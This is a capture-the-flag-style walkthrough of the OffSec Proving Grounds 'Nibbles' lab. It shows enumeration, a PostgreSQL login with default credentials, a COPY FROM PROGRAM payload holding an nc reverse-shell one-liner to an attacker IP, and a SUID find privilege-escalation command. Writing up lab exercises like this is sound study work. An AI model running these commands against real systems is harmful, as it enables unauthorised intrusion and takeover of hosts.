---
title: "PG: Nibbles"
date: 2023-03-07
draft: false
os: "Linux"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/nibbles/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - linux
  - postgresql
  - default-credentials
  - rce
  - suid
  - gtfobins
categories:
  - walkthrough
---

{{< box-info name="Nibbles" os="Linux" difficulty="Medium" ip="192.168.184.47" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
```
{{< /collapse >}}

Four services on a Debian 10 (Buster) box. FTP rejects anonymous login, SSH is a dead end without creds, and Apache serves nothing worth fuzzing. The odd one out is **PostgreSQL on 5437** — not the default 5432. A database exposed straight to the network, on a port someone deliberately moved, is where the attention goes.

### Port 5437 - PostgreSQL

The known PostgreSQL RCE primitive (`COPY ... FROM PROGRAM`) needs an authenticated superuser session first — so the whole box hinges on getting a valid login. Before reaching for a wordlist, try the stock credentials.

---

## Foothold

### PostgreSQL Default Credentials → RCE

The service still had the factory `postgres:postgres` login:

```bash
psql -h 192.168.184.47 --port 5437 -U postgres
```

![psql login to PostgreSQL 11.7 on port 5437 with default postgres:postgres credentials](/images/nibbles/default-creds.png)

A superuser session in PostgreSQL is code execution. `COPY ... FROM PROGRAM` hands its argument straight to a shell on the host, so a table plus one copy statement is a reverse shell:

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.184 80 >/tmp/f';
```

squid22's [PostgreSQL_RCE](https://github.com/squid22/PostgreSQL_RCE) PoC automates the same steps — point it at a listener and fire. The shell lands as the `postgres` user.

---

## Privilege Escalation

### SUID find - GTFOBins

The box runs a strict egress firewall — only the already-open ports are usable for a callback or exfil, so I kept it to manual enumeration instead of dropping LinPEAS over FTP. A SUID sweep turns up `find` carrying the SUID bit. That is an instant [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) win — `find` can exec a shell, and `-p` preserves the elevated privileges:

```bash
find . -exec /bin/sh -p \; -quit
```

Root.

---

## Proof

![Root proof — whoami root, hostname nibbles, and /root/proof.txt](/images/nibbles/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- A service on a non-standard port (PostgreSQL on 5437 instead of 5432) is still a service — always try default creds (`postgres:postgres`) before assuming it's hardened.
- A superuser PostgreSQL session equals RCE: `COPY ... FROM PROGRAM` runs shell commands directly on the host.
- OffSec loves a SUID `find`. `find . -exec /bin/sh -p \; -quit` from GTFOBins is instant root when the SUID bit and `-p` line up.
- Strict egress filtering means you plan the reverse shell and exfil around the ports that are actually open (here, 80) — enumerate manually rather than fighting a blocked LinPEAS callback.
{{< /callout >}}
